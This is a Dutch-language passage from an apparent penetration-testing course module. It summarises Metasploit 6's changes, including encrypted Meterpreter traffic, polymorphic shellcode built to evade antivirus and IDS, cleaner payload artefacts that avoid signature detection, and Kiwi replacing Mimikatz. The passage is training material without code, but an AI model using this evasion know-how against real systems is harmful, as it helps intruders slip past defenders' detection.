Het updaten naar **MSF6** zorgt ervoor dat alle eerdere payload-sessies die zijn opgezet met MSF5 onbruikbaar worden. Bovendien werken payloads die zijn gegenereerd met MSF5 niet met de communicatiemechanismen van MSF6. Hieronder volgt een samenvatting van de belangrijkste wijzigingen en toevoegingen die de update van augustus 2020 met zich meebracht.

### Generatiefuncties

- **End-to-end encryptie:** Beschikbaar voor Meterpreter-sessies in alle vijf de implementaties (Windows, Python, Java, Mettle en PHP).
    
- **SMBv3 client-ondersteuning:** Maakt modernere exploitatie-workflows mogelijk.
    
- **Nieuwe polymorfe payload-generatie:** Een nieuwe routine voor Windows-shellcode die de ontwijkingsmogelijkheden tegen antivirus en IDS-producten verbetert door de code telkens anders op te bouwen.
    

### Uitgebreide Encryptie

- **Verhoogde complexiteit:** Het is moeilijker geworden om signature-based detecties te maken voor specifieke netwerkoperaties en de belangrijkste payload-bestanden van Metasploit.
    
- **Standaard AES:** Alle Meterpreter-payloads gebruiken nu AES-encryptie tijdens de communicatie tussen de aanvalsmachine en het doelwit.
    
- **SMBv3-integratie:** Encryptie binnen SMBv3 bemoeilijkt de detectie van kritieke acties die over dit protocol worden uitgevoerd.
    

### Schonere Payload-artefacten

- **Ordinals in plaats van namen:** DLL's die door de Windows Meterpreter worden gebruikt, roepen functies nu aan op basis van hun 'ordinal' (indexnummer) in plaats van hun naam.
    
- **ReflectiveLoader:** De standaard export `ReflectiveLoader` is niet langer als tekstdata aanwezig in de binaire payload-bestanden.
    
- **Integers in plaats van strings:** Commando's die Meterpreter naar het Framework stuurt, zijn nu gecodeerd als getallen (integers) in plaats van tekst (strings).
    

### Plugins & Payloads

- **Kiwi:** De oude Mimikatz-extensie is verwijderd ten gunste van zijn opvolger, **Kiwi**. Pogingen om Mimikatz te laden, zullen voortaan automatisch Kiwi laden.
    
- **Randomisatie:** De statische generatie van shellcode is vervangen door een randomisatie-routine. Hierdoor krijgt de shellcode polymorfe eigenschappen door instructies elke keer te husselen (shuffelen).
    

---

## Afsluitende Gedachten

Zoals we in deze module hebben gezien, is Metasploit een krachtig framework. Hoewel het vaak verkeerd wordt begrepen of onjuist gelabeld, is het een essentieel onderdeel van je arsenaal als je het correct gebruikt. Het is zeer uitbreidbaar, uitstekend voor het bijhouden van gegevens tijdens een assessment, en onmisbaar voor **post-exploitation** en **pivoting** (het verplaatsen door een netwerk).

Het is de moeite waard om met alle functies van Metasploit te experimenteren om te zien hoe het in jouw workflow past. Als je het liever niet gebruikt, is dat ook prima! Er zijn genoeg andere tools beschikbaar; werk vooral met waar jij je het prettigst bij voelt.

**Wil je meer oefenen?** Check de HTB-machines aan het einde van deze module, probeer Academy-doelen te behalen met Metasploit, of duik in de **Dante Pro Lab** om je pivoting-vaardigheden naar een hoger niveau te tillen.






